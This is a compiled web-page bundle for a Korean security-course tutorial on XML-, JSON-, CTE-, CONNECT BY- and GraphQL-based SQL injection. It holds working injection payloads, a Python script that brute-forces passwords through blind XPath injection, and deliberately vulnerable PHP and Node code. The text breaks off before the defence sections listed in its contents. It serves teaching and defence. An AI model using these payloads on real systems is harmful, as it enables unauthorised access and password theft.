"use strict";(self.webpackChunkmy_docusaurus_website=self.webpackChunkmy_docusaurus_website||[]).push([[3416],{20780:(n,e,s)=>{s.r(e),s.d(e,{assets:()=>c,contentTitle:()=>d,default:()=>h,frontMatter:()=>a,metadata:()=>r,toc:()=>o});const r=JSON.parse('{"id":"sk_rookies/web_attacks/sql_injection/rooted_based","title":"Rooted-based SQL Injection","description":"XML, JSON \uae30\ubc18 SQL Injection \ubc0f \uace0\uae09 \ub370\uc774\ud130 \ucd94\ucd9c \uae30\ubc95","source":"@site/docs/sk_rookies/web_attacks/sql_injection/12_rooted_based.md","sourceDirName":"sk_rookies/web_attacks/sql_injection","slug":"/sk_rookies/web_attacks/sql_injection/rooted_based","permalink":"/my-docusaurus-page/sk_rookies/web_attacks/sql_injection/rooted_based","draft":false,"unlisted":false,"tags":[],"version":"current","sidebarPosition":12,"frontMatter":{"sidebar_position":12,"title":"Rooted-based SQL Injection","description":"XML, JSON \uae30\ubc18 SQL Injection \ubc0f \uace0\uae09 \ub370\uc774\ud130 \ucd94\ucd9c \uae30\ubc95","keywords":["rooted sqli","xml sqli","json sqli","xpath injection","sql injection"]},"sidebar":"tutorialSidebar","previous":{"title":"DBMS\ubcc4 \ud2b9\ud654 \uae30\ubc95","permalink":"/my-docusaurus-page/sk_rookies/web_attacks/sql_injection/database_specific"},"next":{"title":"NoSQL Injection","permalink":"/my-docusaurus-page/sk_rookies/web_attacks/sql_injection/nosql_injection"}}');var l=s(74848),i=s(28453);const a={sidebar_position:12,title:"Rooted-based SQL Injection",description:"XML, JSON \uae30\ubc18 SQL Injection \ubc0f \uace0\uae09 \ub370\uc774\ud130 \ucd94\ucd9c \uae30\ubc95",keywords:["rooted sqli","xml sqli","json sqli","xpath injection","sql injection"]},d="Rooted-based SQL Injection",c={},o=[{value:"\uac1c\ub150 (Concept)",id:"\uac1c\ub150-concept",level:2},{value:"Rooted-based SQLi\ub780?",id:"rooted-based-sqli\ub780",level:3},{value:"\uc0ac\uc6a9 \uc2dc\ub098\ub9ac\uc624",id:"\uc0ac\uc6a9-\uc2dc\ub098\ub9ac\uc624",level:3},{value:"XML \uae30\ubc18 SQL Injection",id:"xml-\uae30\ubc18-sql-injection",level:2},{value:"XPATH Injection",id:"xpath-injection",level:3},{value:"\uae30\ubcf8 \uac1c\ub150",id:"\uae30\ubcf8-\uac1c\ub150",level:4},{value:"\uc778\uc99d \uc6b0\ud68c",id:"\uc778\uc99d-\uc6b0\ud68c",level:4},{value:"Blind XPATH Injection",id:"blind-xpath-injection",level:4},{value:"XPATH \ud568\uc218 \uc545\uc6a9",id:"xpath-\ud568\uc218-\uc545\uc6a9",level:4},{value:"SQL\uc5d0\uc11c XML \ucc98\ub9ac",id:"sql\uc5d0\uc11c-xml-\ucc98\ub9ac",level:3},{value:"MySQL - ExtractValue",id:"mysql---extractvalue",level:4},{value:"MSSQL - XML \ucc98\ub9ac",id:"mssql---xml-\ucc98\ub9ac",level:4},{value:"JSON \uae30\ubc18 SQL Injection",id:"json-\uae30\ubc18-sql-injection",level:2},{value:"JSON \ud568\uc218 \uc545\uc6a9",id:"json-\ud568\uc218-\uc545\uc6a9",level:3},{value:"MySQL JSON \ud568\uc218 (5.7+)",id:"mysql-json-\ud568\uc218-57",level:4},{value:"PostgreSQL JSONB",id:"postgresql-jsonb",level:4},{value:"JSON API Injection",id:"json-api-injection",level:3},{value:"Recursive CTE (Common Table Expression)",id:"recursive-cte-common-table-expression",level:2},{value:"PostgreSQL / MSSQL",id:"postgresql--mssql",level:3},{value:"Time-based SQLi\uc5d0 \ud65c\uc6a9",id:"time-based-sqli\uc5d0-\ud65c\uc6a9",level:3},{value:"\uacc4\uce35 \uad6c\uc870 \ub370\uc774\ud130 \ucd94\ucd9c",id:"\uacc4\uce35-\uad6c\uc870-\ub370\uc774\ud130-\ucd94\ucd9c",level:3},{value:"Oracle CONNECT BY (\uacc4\uce35 \ucffc\ub9ac)",id:"oracle-connect-by-\uacc4\uce35-\ucffc\ub9ac",level:2},{value:"\uae30\ubcf8 \uc0ac\uc6a9\ubc95",id:"\uae30\ubcf8-\uc0ac\uc6a9\ubc95",level:3},{value:"SQLi \uc545\uc6a9",id:"sqli-\uc545\uc6a9",level:3},{value:"GraphQL Injection",id:"graphql-injection",level:2},{value:"GraphQL\uc774\ub780?",id:"graphql\uc774\ub780",level:3},{value:"GraphQL Injection",id:"graphql-injection-1",level:3},{value:"GraphQL Introspection \uc545\uc6a9",id:"graphql-introspection-\uc545\uc6a9",level:3},{value:"\uc2e4\uc804 \uacf5\uaca9 \uc2dc\ub098\ub9ac\uc624",id:"\uc2e4\uc804-\uacf5\uaca9-\uc2dc\ub098\ub9ac\uc624",level:2},{value:"\uc2dc\ub098\ub9ac\uc624: XML API \uacf5\uaca9",id:"\uc2dc\ub098\ub9ac\uc624-xml-api-\uacf5\uaca9",level:3},{value:"\ubc29\uc5b4 \uae30\ubc95",id:"\ubc29\uc5b4-\uae30\ubc95",level:2},{value:"1. Parameterized Queries",id:"1-parameterized-queries",level:3},{value:"2. Input Validation",id:"2-input-validation",level:3},{value:"3. GraphQL Depth Limiting",id:"3-graphql-depth-limiting",level:3},{value:"\ube60\ub978 \uba85\ub839\uc5b4 \ucc38\uc870",id:"\ube60\ub978-\uba85\ub839\uc5b4-\ucc38\uc870",level:2},{value:"XPATH Injection",id:"xpath-injection-1",level:3},{value:"SQL XML Functions",id:"sql-xml-functions",level:3},{value:"JSON Functions",id:"json-functions",level:3},{value:"Recursive CTE",id:"recursive-cte",level:3},{value:"\ucc38\uace0 \uc790\ub8cc",id:"\ucc38\uace0-\uc790\ub8cc",level:2},{value:"\ub2e4\uc74c \ub2e8\uacc4",id:"\ub2e4\uc74c-\ub2e8\uacc4",level:2}];function t(n){const e={a:"a",blockquote:"blockquote",code:"code",h1:"h1",h2:"h2",h3:"h3",h4:"h4",header:"header",hr:"hr",li:"li",p:"p",pre:"pre",strong:"strong",ul:"ul",...(0,i.R)(),...n.components};return(0,l.jsxs)(l.Fragment,{children:[(0,l.jsx)(e.header,{children:(0,l.jsx)(e.h1,{id:"rooted-based-sql-injection",children:"Rooted-based SQL Injection"})}),"\n",(0,l.jsxs)(e.blockquote,{children:["\n",(0,l.jsx)(e.p,{children:"Rooted-based SQLi\ub294 XML, JSON \ub4f1 \uad6c\uc870\ud654\ub41c \ub370\uc774\ud130 \ud615\uc2dd\uc744 \uc774\uc6a9\ud55c SQL Injection\uacfc \uad00\ub828 \uace0\uae09 \uae30\ubc95\uc744 \ub2e4\ub8f9\ub2c8\ub2e4."}),"\n"]}),"\n",(0,l.jsx)(e.h2,{id:"\uac1c\ub150-concept",children:"\uac1c\ub150 (Concept)"}),"\n",(0,l.jsx)(e.h3,{id:"rooted-based-sqli\ub780",children:"Rooted-based SQLi\ub780?"}),"\n",(0,l.jsxs)(e.p,{children:[(0,l.jsx)(e.strong,{children:"Rooted-based SQL Injection"}),"\uc740 \ub370\uc774\ud130\ubca0\uc774\uc2a4\uc758 ",(0,l.jsx)(e.strong,{children:"\uacc4\uce35 \uad6c\uc870 \ub610\ub294 \ud2b8\ub9ac \uad6c\uc870"})," \uae30\ub2a5\uc744 \uc545\uc6a9\ud558\ub294 \uae30\ubc95\uc785\ub2c8\ub2e4:"]}),"\n",(0,l.jsxs)(e.ul,{children:["\n",(0,l.jsxs)(e.li,{children:[(0,l.jsx)(e.strong,{children:"XML \uae30\ubc18 \uacf5\uaca9"})," (XPATH Injection)"]}),"\n",(0,l.jsx)(e.li,{children:(0,l.jsx)(e.strong,{children:"JSON \uae30\ubc18 \uacf5\uaca9"})}),"\n",(0,l.jsx)(e.li,{children:(0,l.jsx)(e.strong,{children:"Recursive CTE \uacf5\uaca9"})}),"\n",(0,l.jsxs)(e.li,{children:[(0,l.jsx)(e.strong,{children:"\uacc4\uce35 \ucffc\ub9ac \uacf5\uaca9"})," (Oracle CONNECT BY)"]}),"\n"]}),"\n",(0,l.jsx)(e.h3,{id:"\uc0ac\uc6a9-\uc2dc\ub098\ub9ac\uc624",children:"\uc0ac\uc6a9 \uc2dc\ub098\ub9ac\uc624"}),"\n",(0,l.jsxs)(e.ul,{children:["\n",(0,l.jsx)(e.li,{children:"XML/JSON\uc744 \ucc98\ub9ac\ud558\ub294 API"}),"\n",(0,l.jsx)(e.li,{children:"NoSQL\uacfc SQL\uc758 \ud63c\ud569 \ud658\uacbd"}),"\n",(0,l.jsx)(e.li,{children:"\ubcf5\uc7a1\ud55c \ub370\uc774\ud130 \uad6c\uc870\ub97c \uac00\uc9c4 \uc560\ud50c\ub9ac\ucf00\uc774\uc158"}),"\n"]}),"\n",(0,l.jsx)(e.hr,{}),"\n",(0,l.jsx)(e.h2,{id:"xml-\uae30\ubc18-sql-injection",children:"XML \uae30\ubc18 SQL Injection"}),"\n",(0,l.jsx)(e.h3,{id:"xpath-injection",children:"XPATH Injection"}),"\n",(0,l.jsx)(e.h4,{id:"\uae30\ubcf8-\uac1c\ub150",children:"\uae30\ubcf8 \uac1c\ub150"}),"\n",(0,l.jsxs)(e.p,{children:[(0,l.jsx)(e.strong,{children:"XPATH"}),"\ub294 XML \ubb38\uc11c\uc5d0\uc11c \ub370\uc774\ud130\ub97c \ucc3e\ub294 \ucffc\ub9ac \uc5b8\uc5b4\uc785\ub2c8\ub2e4."]}),"\n",(0,l.jsxs)(e.p,{children:[(0,l.jsx)(e.strong,{children:"XML \uc608\uc2dc"}),":"]}),"\n",(0,l.jsx)(e.pre,{children:(0,l.jsx)(e.code,{className:"language-xml",children:"<users>\n  <user>\n    <username>admin</username>\n    <password>5f4dcc3b5aa765d61d8327deb882cf99</password>\n    <role>admin</role>\n  </user>\n  <user>\n    <username>user1</username>\n    <password>098f6bcd4621d373cade4e832627b4f6</password>\n    <role>user</role>\n  </user>\n</users>\n"})}),"\n",(0,l.jsxs)(e.p,{children:[(0,l.jsx)(e.strong,{children:"\uc815\uc0c1 XPATH \ucffc\ub9ac"}),":"]}),"\n",(0,l.jsx)(e.pre,{children:(0,l.jsx)(e.code,{className:"language-xpath",children:"//user[username='admin' and password='password123']\n"})}),"\n",(0,l.jsxs)(e.p,{children:[(0,l.jsx)(e.strong,{children:"XPATH Injection"}),":"]}),"\n",(0,l.jsx)(e.pre,{children:(0,l.jsx)(e.code,{className:"language-xpath",children:"//user[username='admin' or '1'='1' and password='anything']\n"})}),"\n",(0,l.jsx)(e.p,{children:"\u2192 \ubaa8\ub4e0 \uc0ac\uc6a9\uc790 \ubc18\ud658"}),"\n",(0,l.jsx)(e.hr,{}),"\n",(0,l.jsx)(e.h4,{id:"\uc778\uc99d-\uc6b0\ud68c",children:"\uc778\uc99d \uc6b0\ud68c"}),"\n",(0,l.jsxs)(e.p,{children:[(0,l.jsx)(e.strong,{children:"\ucde8\uc57d\ud55c \ucf54\ub4dc"})," (PHP):"]}),"\n",(0,l.jsx)(e.pre,{children:(0,l.jsx)(e.code,{className:"language-php",children:"$username = $_POST['username'];\n$password = $_POST['password'];\n\n$xpath = \"//user[username='$username' and password='$password']\";\n$result = $xml->xpath($xpath);\n\nif ($result) {\n    // \ub85c\uadf8\uc778 \uc131\uacf5\n}\n"})}),"\n",(0,l.jsxs)(e.p,{children:[(0,l.jsx)(e.strong,{children:"\uacf5\uaca9 \ud398\uc774\ub85c\ub4dc"}),":"]}),"\n",(0,l.jsx)(e.pre,{children:(0,l.jsx)(e.code,{children:"Username: admin' or '1'='1\nPassword: anything\n"})}),"\n",(0,l.jsxs)(e.p,{children:[(0,l.jsx)(e.strong,{children:"\uc0dd\uc131\ub418\ub294 XPATH"}),":"]}),"\n",(0,l.jsx)(e.pre,{children:(0,l.jsx)(e.code,{className:"language-xpath",children:"//user[username='admin' or '1'='1' and password='anything']\n"})}),"\n",(0,l.jsxs)(e.p,{children:["\u2192 ",(0,l.jsx)(e.strong,{children:"\uc778\uc99d \uc6b0\ud68c \uc131\uacf5"})]}),"\n",(0,l.jsx)(e.hr,{}),"\n",(0,l.jsx)(e.h4,{id:"blind-xpath-injection",children:"Blind XPATH Injection"}),"\n",(0,l.jsxs)(e.p,{children:[(0,l.jsx)(e.strong,{children:"\ub370\uc774\ud130 \ucd94\ucd9c"})," (Boolean-based):"]}),"\n",(0,l.jsx)(e.pre,{children:(0,l.jsx)(e.code,{children:"Username: admin' and substring(password,1,1)='5\nPassword: (anything)\n"})}),"\n",(0,l.jsxs)(e.p,{children:[(0,l.jsx)(e.strong,{children:"\uc0dd\uc131\ub418\ub294 XPATH"}),":"]}),"\n",(0,l.jsx)(e.pre,{children:(0,l.jsx)(e.code,{className:"language-xpath",children:"//user[username='admin' and substring(password,1,1)='5' and password='anything']\n"})}),"\n",(0,l.jsxs)(e.ul,{children:["\n",(0,l.jsx)(e.li,{children:"\uc751\ub2f5 \uc131\uacf5 \u2192 \uccab \ubc88\uc9f8 \ubb38\uc790\ub294 '5'"}),"\n",(0,l.jsx)(e.li,{children:"\uc751\ub2f5 \uc2e4\ud328 \u2192 \ub2e4\ub978 \ubb38\uc790"}),"\n"]}),"\n",(0,l.jsxs)(e.p,{children:[(0,l.jsx)(e.strong,{children:"\uc790\ub3d9\ud654 \uc2a4\ud06c\ub9bd\ud2b8"})," (Python):"]}),"\n",(0,l.jsx)(e.pre,{children:(0,l.jsx)(e.code,{className:"language-python",children:'import requests\nimport string\n\nurl = "http://example.com/login"\npassword = ""\ncharset = string.hexdigits\n\nfor position in range(1, 50):\n    for char in charset:\n        payload = f"admin\' and substring(password,{position},1)=\'{char}"\n\n        r = requests.post(url, data={\n            "username": payload,\n            "password": "anything"\n        })\n\n        if "Welcome" in r.text:\n            password += char\n            print(f"[+] Password: {password}")\n            break\n    else:\n        break\n\nprint(f"[+] Final password: {password}")\n'})}),"\n",(0,l.jsx)(e.hr,{}),"\n",(0,l.jsx)(e.h4,{id:"xpath-\ud568\uc218-\uc545\uc6a9",children:"XPATH \ud568\uc218 \uc545\uc6a9"}),"\n",(0,l.jsx)(e.pre,{children:(0,l.jsx)(e.code,{className:"language-xpath",children:"# \ubb38\uc790\uc5f4 \uae38\uc774\ncount(//user)  -- \uc0ac\uc6a9\uc790 \uc218\nstring-length(//user[1]/password)  -- \ube44\ubc00\ubc88\ud638 \uae38\uc774\n\n# \ub178\ub4dc \uc874\uc7ac \uc5ec\ubd80\nname(//user[1]/*)  -- \uccab \ubc88\uc9f8 \uc790\uc2dd \ub178\ub4dc \uc774\ub984\ncount(//user[role='admin'])  -- \uad00\ub9ac\uc790 \uc218\n"})}),"\n",(0,l.jsx)(e.hr,{}),"\n",(0,l.jsx)(e.h3,{id:"sql\uc5d0\uc11c-xml-\ucc98\ub9ac",children:"SQL\uc5d0\uc11c XML \ucc98\ub9ac"}),"\n",(0,l.jsx)(e.h4,{id:"mysql---extractvalue",children:"MySQL - ExtractValue"}),"\n",(0,l.jsxs)(e.p,{children:[(0,l.jsx)(e.strong,{children:"XML \ub370\uc774\ud130 \ucd94\ucd9c"}),":"]}),"\n",(0,l.jsx)(e.pre,{children:(0,l.jsx)(e.code,{className:"language-sql",children:"SELECT ExtractValue('<user><name>admin</name></user>', '/user/name')\n"})}),"\n",(0,l.jsxs)(e.p,{children:[(0,l.jsx)(e.strong,{children:"Error-based SQLi\uc640 \uacb0\ud569"}),":"]}),"\n",(0,l.jsx)(e.pre,{children:(0,l.jsx)(e.code,{className:"language-sql",children:"' AND ExtractValue(1, CONCAT(0x7e, (SELECT password FROM users LIMIT 1)))--\n"})}),"\n",(0,l.jsxs)(e.p,{children:[(0,l.jsx)(e.strong,{children:"\ucd9c\ub825"}),":"]}),"\n",(0,l.jsx)(e.pre,{children:(0,l.jsx)(e.code,{children:"XPATH syntax error: '~5f4dcc3b5aa765d61d8327deb882cf99'\n"})}),"\n",(0,l.jsx)(e.h4,{id:"mssql---xml-\ucc98\ub9ac",children:"MSSQL - XML \ucc98\ub9ac"}),"\n",(0,l.jsxs)(e.p,{children:[(0,l.jsx)(e.strong,{children:"FOR XML PATH"}),":"]}),"\n",(0,l.jsx)(e.pre,{children:(0,l.jsx)(e.code,{className:"language-sql",children:"SELECT username + ':' + password FROM users FOR XML PATH('')\n"})}),"\n",(0,l.jsxs)(e.p,{children:[(0,l.jsx)(e.strong,{children:"SQLi \ud398\uc774\ub85c\ub4dc"}),":"]}),"\n",(0,l.jsx)(e.pre,{children:(0,l.jsx)(e.code,{className:"language-sql",children:"' UNION SELECT NULL, (SELECT username+':'+password FROM users FOR XML PATH(''))--\n"})}),"\n",(0,l.jsx)(e.hr,{}),"\n",(0,l.jsx)(e.h2,{id:"json-\uae30\ubc18-sql-injection",children:"JSON \uae30\ubc18 SQL Injection"}),"\n",(0,l.jsx)(e.h3,{id:"json-\ud568\uc218-\uc545\uc6a9",children:"JSON \ud568\uc218 \uc545\uc6a9"}),"\n",(0,l.jsx)(e.h4,{id:"mysql-json-\ud568\uc218-57",children:"MySQL JSON \ud568\uc218 (5.7+)"}),"\n",(0,l.jsxs)(e.p,{children:[(0,l.jsx)(e.strong,{children:"\ub370\uc774\ud130 \uc800\uc7a5"}),":"]}),"\n",(0,l.jsx)(e.pre,{children:(0,l.jsx)(e.code,{className:"language-sql",children:'CREATE TABLE users (\n    id INT,\n    data JSON\n);\n\nINSERT INTO users VALUES (1, \'{"username":"admin","password":"hash","role":"admin"}\');\n'})}),"\n",(0,l.jsxs)(e.p,{children:[(0,l.jsx)(e.strong,{children:"\ucffc\ub9ac"}),":"]}),"\n",(0,l.jsx)(e.pre,{children:(0,l.jsx)(e.code,{className:"language-sql",children:"SELECT JSON_EXTRACT(data, '$.username') FROM users WHERE JSON_EXTRACT(data, '$.role')='admin'\n"})}),"\n",(0,l.jsxs)(e.p,{children:[(0,l.jsx)(e.strong,{children:"SQLi \ud398\uc774\ub85c\ub4dc"}),":"]}),"\n",(0,l.jsx)(e.pre,{children:(0,l.jsx)(e.code,{className:"language-sql",children:"' OR JSON_EXTRACT(data, '$.role')='admin'--\n' UNION SELECT JSON_EXTRACT(data, '$.password') FROM users--\n"})}),"\n",(0,l.jsx)(e.hr,{}),"\n",(0,l.jsx)(e.h4,{id:"postgresql-jsonb",children:"PostgreSQL JSONB"}),"\n",(0,l.jsxs)(e.p,{children:[(0,l.jsx)(e.strong,{children:"\ub370\uc774\ud130 \uc800\uc7a5"}),":"]}),"\n",(0,l.jsx)(e.pre,{children:(0,l.jsx)(e.code,{className:"language-sql",children:'CREATE TABLE users (\n    id SERIAL,\n    data JSONB\n);\n\nINSERT INTO users VALUES (1, \'{"username":"admin","password":"5f4dcc3b","role":"admin"}\');\n'})}),"\n",(0,l.jsxs)(e.p,{children:[(0,l.jsx)(e.strong,{children:"\ucffc\ub9ac"}),":"]}),"\n",(0,l.jsx)(e.pre,{children:(0,l.jsx)(e.code,{className:"language-sql",children:"SELECT data->>'username' FROM users WHERE data->>'role'='admin'\n"})}),"\n",(0,l.jsxs)(e.p,{children:[(0,l.jsx)(e.strong,{children:"SQLi \ud398\uc774\ub85c\ub4dc"}),":"]}),"\n",(0,l.jsx)(e.pre,{children:(0,l.jsx)(e.code,{className:"language-sql",children:"' OR data->>'role'='admin'--\n' UNION SELECT data->>'password' FROM users--\n"})}),"\n",(0,l.jsx)(e.hr,{}),"\n",(0,l.jsx)(e.h3,{id:"json-api-injection",children:"JSON API Injection"}),"\n",(0,l.jsxs)(e.p,{children:[(0,l.jsx)(e.strong,{children:"\ucde8\uc57d\ud55c API"}),":"]}),"\n",(0,l.jsx)(e.pre,{children:(0,l.jsx)(e.code,{className:"language-javascript",children:"// Node.js + Express\napp.post('/login', (req, res) => {\n    const username = req.body.username;\n    const password = req.body.password;\n\n    const query = `SELECT * FROM users WHERE username='${username}' AND password='${password}'`;\n    db.query(query, (err, result) => {\n        if (result.length > 0) {\n            res.json({success: true});\n        }\n    });\n});\n"})}),"\n",(0,l.jsxs)(e.p,{children:[(0,l.jsx)(e.strong,{children:"\uacf5\uaca9 \uc694\uccad"}),":"]}),"\n",(0,l.jsx)(e.pre,{children:(0,l.jsx)(e.code,{className:"language-http",children:'POST /login HTTP/1.1\nHost: example.com\nContent-Type: application/json\n\n{\n    "username": "admin\' OR \'1\'=\'1",\n    "password": "anything"\n}\n'})}),"\n",(0,l.jsxs)(e.p,{children:[(0,l.jsx)(e.strong,{children:"\uc0dd\uc131\ub418\ub294 \ucffc\ub9ac"}),":"]}),"\n",(0,l.jsx)(e.pre,{children:(0,l.jsx)(e.code,{className:"language-sql",children:"SELECT * FROM users WHERE username='admin' OR '1'='1' AND password='anything'\n"})}),"\n",(0,l.jsxs)(e.p,{children:["\u2192 ",(0,l.jsx)(e.strong,{children:"\uc778\uc99d \uc6b0\ud68c"})]}),"\n",(0,l.jsx)(e.hr,{}),"\n",(0,l.jsx)(e.h2,{id:"recursive-cte-common-table-expression",children:"Recursive CTE (Common Table Expression)"}),"\n",(0,l.jsx)(e.h3,{id:"postgresql--mssql",children:"PostgreSQL / MSSQL"}),"\n",(0,l.jsxs)(e.p,{children:[(0,l.jsx)(e.strong,{children:"Recursive CTE"}),"\ub294 \uc790\uae30 \uc790\uc2e0\uc744 \ucc38\uc870\ud558\ub294 \ucffc\ub9ac:"]}),"\n",(0,l.jsx)(e.pre,{children:(0,l.jsx)(e.code,{className:"language-sql",children:"WITH RECURSIVE t(n) AS (\n    SELECT 1\n    UNION ALL\n    SELECT n+1 FROM t WHERE n < 10\n)\nSELECT n FROM t;\n"})}),"\n",(0,l.jsxs)(e.p,{children:[(0,l.jsx)(e.strong,{children:"\ucd9c\ub825"}),": 1, 2, 3, ..., 10"]}),"\n",(0,l.jsx)(e.hr,{}),"\n",(0,l.jsx)(e.h3,{id:"time-based-sqli\uc5d0-\ud65c\uc6a9",children:"Time-based SQLi\uc5d0 \ud65c\uc6a9"}),"\n",(0,l.jsxs)(e.p,{children:[(0,l.jsx)(e.strong,{children:"MSSQL"}),":"]}),"\n",(0,l.jsx)(e.pre,{children:(0,l.jsx)(e.code,{className:"language-sql",children:"'; WITH RECURSIVE t(n) AS (SELECT 1 UNION ALL SELECT n+1 FROM t WHERE n < 10000000) SELECT n FROM t--\n"})}),"\n",(0,l.jsx)(e.p,{children:"\u2192 \uc218\ubc31\ub9cc \ubc88 \uc7ac\uadc0 \ud638\ucd9c\ub85c \uc2dc\uac04 \uc9c0\uc5f0"}),"\n",(0,l.jsx)(e.hr,{}),"\n",(0,l.jsx)(e.h3,{id:"\uacc4\uce35-\uad6c\uc870-\ub370\uc774\ud130-\ucd94\ucd9c",children:"\uacc4\uce35 \uad6c\uc870 \ub370\uc774\ud130 \ucd94\ucd9c"}),"\n",(0,l.jsxs)(e.p,{children:[(0,l.jsx)(e.strong,{children:"\uc870\uc9c1\ub3c4 \uc608\uc2dc"}),":"]}),"\n",(0,l.jsx)(e.pre,{children:(0,l.jsx)(e.code,{className:"language-sql",children:"CREATE TABLE employees (\n    id INT,\n    name VARCHAR(100),\n    manager_id INT\n);\n\nINSERT INTO employees VALUES\n(1, 'CEO', NULL),\n(2, 'CTO', 1),\n(3, 'Dev1', 2),\n(4, 'Dev2', 2);\n"})}),"\n",(0,l.jsxs)(e.p,{children:[(0,l.jsx)(e.strong,{children:"Recursive CTE\ub85c \uc804\uccb4 \uacc4\uce35 \ucd94\ucd9c"}),":"]}),"\n",(0,l.jsx)(e.pre,{children:(0,l.jsx)(e.code,{className:"language-sql",children:"WITH RECURSIVE org_chart AS (\n    SELECT id, name, manager_id, 1 AS level\n    FROM employees\n    WHERE manager_id IS NULL\n\n    UNION ALL\n\n    SELECT e.id, e.name, e.manager_id, oc.level + 1\n    FROM employees e\n    JOIN org_chart oc ON e.manager_id = oc.id\n)\nSELECT * FROM org_chart;\n"})}),"\n",(0,l.jsxs)(e.p,{children:[(0,l.jsx)(e.strong,{children:"SQLi \ud398\uc774\ub85c\ub4dc"}),":"]}),"\n",(0,l.jsx)(e.pre,{children:(0,l.jsx)(e.code,{className:"language-sql",children:"' UNION SELECT name, NULL, NULL, NULL FROM (WITH RECURSIVE org_chart AS (...) SELECT name FROM org_chart)--\n"})}),"\n",(0,l.jsx)(e.hr,{}),"\n",(0,l.jsx)(e.h2,{id:"oracle-connect-by-\uacc4\uce35-\ucffc\ub9ac",children:"Oracle CONNECT BY (\uacc4\uce35 \ucffc\ub9ac)"}),"\n",(0,l.jsx)(e.h3,{id:"\uae30\ubcf8-\uc0ac\uc6a9\ubc95",children:"\uae30\ubcf8 \uc0ac\uc6a9\ubc95"}),"\n",(0,l.jsxs)(e.p,{children:[(0,l.jsx)(e.strong,{children:"\uacc4\uce35 \uad6c\uc870 \uc870\ud68c"}),":"]}),"\n",(0,l.jsx)(e.pre,{children:(0,l.jsx)(e.code,{className:"language-sql",children:"SELECT LEVEL, LPAD(' ', 2*(LEVEL-1)) || name AS employee\nFROM employees\nSTART WITH manager_id IS NULL\nCONNECT BY PRIOR id = manager_id;\n"})}),"\n",(0,l.jsxs)(e.p,{children:[(0,l.jsx)(e.strong,{children:"\ucd9c\ub825"}),":"]}),"\n",(0,l.jsx)(e.pre,{children:(0,l.jsx)(e.code,{children:"1  CEO\n2    CTO\n3      Dev1\n3      Dev2\n"})}),"\n",(0,l.jsx)(e.hr,{}),"\n",(0,l.jsx)(e.h3,{id:"sqli-\uc545\uc6a9",children:"SQLi \uc545\uc6a9"}),"\n",(0,l.jsxs)(e.p,{children:[(0,l.jsx)(e.strong,{children:"\ub370\uc774\ud130 \ubc18\ubcf5 \ucd94\ucd9c"}),":"]}),"\n",(0,l.jsx)(e.pre,{children:(0,l.jsx)(e.code,{className:"language-sql",children:"' UNION SELECT LEVEL FROM dual CONNECT BY LEVEL <= 100--\n"})}),"\n",(0,l.jsx)(e.p,{children:"\u2192 1\ubd80\ud130 100\uae4c\uc9c0 \uc22b\uc790 \uc0dd\uc131"}),"\n",(0,l.jsxs)(e.p,{children:[(0,l.jsx)(e.strong,{children:"\ubb38\uc790\uc5f4 \ubd84\ud560 \ucd94\ucd9c"}),":"]}),"\n",(0,l.jsx)(e.pre,{children:(0,l.jsx)(e.code,{className:"language-sql",children:"' UNION SELECT SUBSTR(password, LEVEL, 1) FROM users CONNECT BY LEVEL <= LENGTH(password)--\n"})}),"\n",(0,l.jsx)(e.p,{children:"\u2192 \ube44\ubc00\ubc88\ud638\ub97c \ud55c \uae00\uc790\uc529 \ubd84\ub9ac"}),"\n",(0,l.jsx)(e.hr,{}),"\n",(0,l.jsx)(e.h2,{id:"graphql-injection",children:"GraphQL Injection"}),"\n",(0,l.jsx)(e.h3,{id:"graphql\uc774\ub780",children:"GraphQL\uc774\ub780?"}),"\n",(0,l.jsxs)(e.p,{children:[(0,l.jsx)(e.strong,{children:"GraphQL"}),"\uc740 API \ucffc\ub9ac \uc5b8\uc5b4\ub85c, RESTful API\uc758 \ub300\uc548\uc785\ub2c8\ub2e4."]}),"\n",(0,l.jsxs)(e.p,{children:[(0,l.jsx)(e.strong,{children:"\uc815\uc0c1 \ucffc\ub9ac"}),":"]}),"\n",(0,l.jsx)(e.pre,{children:(0,l.jsx)(e.code,{className:"language-graphql",children:"{\n  user(id: 1) {\n    username\n    email\n  }\n}\n"})}),"\n",(0,l.jsx)(e.hr,{}),"\n",(0,l.jsx)(e.h3,{id:"graphql-injection-1",children:"GraphQL Injection"}),"\n",(0,l.jsxs)(e.p,{children:[(0,l.jsx)(e.strong,{children:"\ucde8\uc57d\ud55c \ubc31\uc5d4\ub4dc"})," (Node.js):"]}),"\n",(0,l.jsx)(e.pre,{children:(0,l.jsx)(e.code,{className:"language-javascript",children:"const resolvers = {\n    Query: {\n        user: (parent, args) => {\n            const query = `SELECT * FROM users WHERE id=${args.id}`;\n            return db.query(query);\n        }\n    }\n};\n"})}),"\n",(0,l.jsxs)(e.p,{children:[(0,l.jsx)(e.strong,{children:"\uacf5\uaca9 \ucffc\ub9ac"}),":"]}),"\n",(0,l.jsx)(e.pre,{children:(0,l.jsx)(e.code,{className:"language-graphql",children:'{\n  user(id: "1 OR 1=1") {\n    username\n    password\n  }\n}\n'})}),"\n",(0,l.jsxs)(e.p,{children:[(0,l.jsx)(e.strong,{children:"\uc0dd\uc131\ub418\ub294 SQL"}),":"]}),"\n",(0,l.jsx)(e.pre,{children:(0,l.jsx)(e.code,{className:"language-sql",children:"SELECT * FROM users WHERE id=1 OR 1=1\n"})}),"\n",(0,l.jsx)(e.p,{children:"\u2192 \ubaa8\ub4e0 \uc0ac\uc6a9\uc790 \uc815\ubcf4 \ub178\ucd9c"}),"\n",(0,l.jsx)(e.hr,{}),"\n",(0,l.jsx)(e.h3,{id:"graphql-introspection-\uc545\uc6a9",children:"GraphQL Introspection \uc545\uc6a9"}),"\n",(0,l.jsxs)(e.p,{children:[(0,l.jsx)(e.strong,{children:"\uc2a4\ud0a4\ub9c8 \uc815\ubcf4 \uc218\uc9d1"}),":"]}),"\n",(0,l.jsx)(e.pre,{children:(0,l.jsx)(e.code,{className:"language-graphql",children:"{\n  __schema {\n    types {\n      name\n      fields {\n        name\n        type {\n          name\n        }\n      }\n    }\n  }\n}\n"})}),"\n",(0,l.jsxs)(e.p,{children:[(0,l.jsx)(e.strong,{children:"\uc751\ub2f5"}),":"]}),"\n",(0,l.jsx)(e.pre,{children:(0,l.jsx)(e.code,{className:"language-json",children:'{\n  "data": {\n    "__schema": {\n      "types": [\n        {\n          "name": "User",\n          "fields": [\n            {"name": "id", "type": {"name": "Int"}},\n            {"name": "username", "type": {"name": "String"}},\n            {"name": "password", "type": {"name": "String"}},\n            {"name": "role", "type": {"name": "String"}}\n          ]\n        }\n      ]\n    }\n  }\n}\n'})}),"\n",(0,l.jsxs)(e.p,{children:["\u2192 